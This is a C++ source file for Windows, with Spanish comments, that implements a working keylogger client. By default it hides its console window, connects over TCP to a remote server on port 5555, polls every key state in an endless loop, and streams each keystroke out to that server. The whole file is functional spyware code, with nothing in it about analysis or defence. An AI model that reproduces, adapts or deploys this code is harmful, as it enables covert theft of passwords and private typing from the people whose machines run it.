#define _WIN32_WINNT 0x0500 //getConsoleWindow()
#include <cstdio>
#include <winsock2.h>
#include <string>
#include <map> //Array asociativo

using namespace std;

class Client{
public:
	WSADATA WSAData;
	SOCKET server;
	SOCKADDR_IN addr;

	map<int, string> ch;

	char buffer[1024];
	char ip[15] = "192.168.1.136";


	Client(const char* argIP) {

		strncpy(ip, argIP, 14);
		ip[14] = '\0';

		ch[1] = " [mouse click] ";
		ch[2] = " [mouse menu context] ";
		ch[8] = " [Backspace] ";
		ch[9] = " [Tab] ";
		ch[13] = " [Intro] ";
		ch[16] = " [Shift] ";
		ch[17] = " [Control] ";
		ch[18] = " [Alt] ";
		ch[20] = " [Bloq Mayús] ";
		ch[27] = " [Esc] ";
		ch[32] = " ";
		ch[37] = " [Flecha izquierda] ";
		ch[38] = " [Flecha arriba] ";
		ch[39] = " [Flecha derecha] ";
		ch[40] = " [Flecha abajo] ";
		ch[44] = " [Impr Pant] ";
		ch[45] = " [Insert] ";
		ch[46] = " [Supr] ";
		ch[48] = "0";
		ch[49] = "1";
		ch[50] = "2";
		ch[51] = "3";
		ch[52] = "4";
		ch[53] = "5";
		ch[54] = "6";
		ch[55] = "7";
		ch[56] = "8";
		ch[57] = "9";
		ch[65] = "a";
		ch[66] = "b";
		ch[67] = "c";
		ch[68] = "d";
		ch[69] = "e";
		ch[70] = "f";
		ch[71] = "g";
		ch[72] = "h";
		ch[73] = "i";
		ch[74] = "j";
		ch[75] = "k";
		ch[76] = "l";
		ch[77] = "m";
		ch[78] = "n";
		ch[79] = "o";
		ch[80] = "p";
		ch[81] = "q";
		ch[82] = "r";
		ch[83] = "s";
		ch[84] = "t";
		ch[85] = "u";
		ch[86] = "v";
		ch[87] = "w";
		ch[88] = "x";
		ch[89] = "y";
		ch[90] = "z";
		ch[91] = " [Menu Windows] ";
		ch[96] = "0";
		ch[97] = "1";
		ch[98] = "2";
		ch[99] = "3";
		ch[100] = "4";
		ch[101] = "5";
		ch[102] = "6";
		ch[103] = "7";
		ch[104] = "8";
		ch[105] = "9";
		ch[106] = "*";
		ch[107] = "+";
		ch[109] = "-";
		ch[110] = ".";
		ch[111] = "/";
		ch[112] = " [F1] ";
		ch[113] = " [F2] ";
		ch[114] = " [F3] ";
		ch[115] = " [F4] ";
		ch[116] = " [F5] ";
		ch[117] = " [F6] ";
		ch[118] = " [F7] ";
		ch[119] = " [F8] ";
		ch[120] = " [F9] ";
		ch[121] = " [F10] ";
		ch[122] = " [F11] ";
		ch[123] = " [F12] ";
		ch[144] = " [ Bloq Num ] ";
		ch[145] = " [Bloq Despl] ";
		ch[186] = "`";
		ch[187] = "+";
		ch[188] = ",";
		ch[189] = "-";
		ch[190] = ".";
		ch[191] = "ç";
		ch[192] = "ñ";
		ch[219] = "'";
		ch[220] = "º";
		ch[221] = "¡";
		ch[222] = "´";
		ch[226] = "<";

		printf("Concetando al servidor...\n");
		WSAStartup(MAKEWORD(2,0), &WSAData);
		server = socket(AF_INET, SOCK_STREAM, 0);
		addr.sin_addr.s_addr = inet_addr(ip);
		addr.sin_family = AF_INET;
		addr.sin_port = htons(5555);
		connect(server, (SOCKADDR *)&addr, sizeof(addr));
		printf("Servidor concetado\n");
	}

	void Enviar() {

		bool registro = false;

		for (int c = 0; c < 256; c++) {
			if (GetAsyncKeyState(c) == -32767) {
				strncpy(this->buffer, ch[c].c_str(), sizeof(this->buffer) - 1);
				this->buffer[sizeof(this->buffer) - 1] = '\0';
				
				registro = true;
			}
		}

		if (registro) {
			send(server, buffer, sizeof(buffer), 0);
			memset(buffer, 0, sizeof(buffer));
			//printf("Mensaje enviado\n");
		}
	}

	void Recibir() {

		recv(server, buffer, sizeof(buffer), 0);
		printf("[Servidor]: %s\n", buffer);
		memset(buffer, 0, sizeof(buffer));
	}

	void CerrarSocket() {

		closesocket(server);
		WSACleanup();
		printf("Servidor cerrado\n");
	}
};

int main(int argc, char* argv[]) {

	HWND hWnd = GetConsoleWindow();
	// 0 = oculta ; 1 = visible
	if (argc >= 3) {
		std::string argStr = argv[2];
		ShowWindow(hWnd, std::stoi(argStr));
	} else {
		ShowWindow(hWnd, 0);
	}

	Client *Cliente = new Client((argc >= 2) ? argv[1]: "192.168.1.136");
	while(true)	{
		Cliente->Enviar();
		//Cliente->Recibir();
	}
}
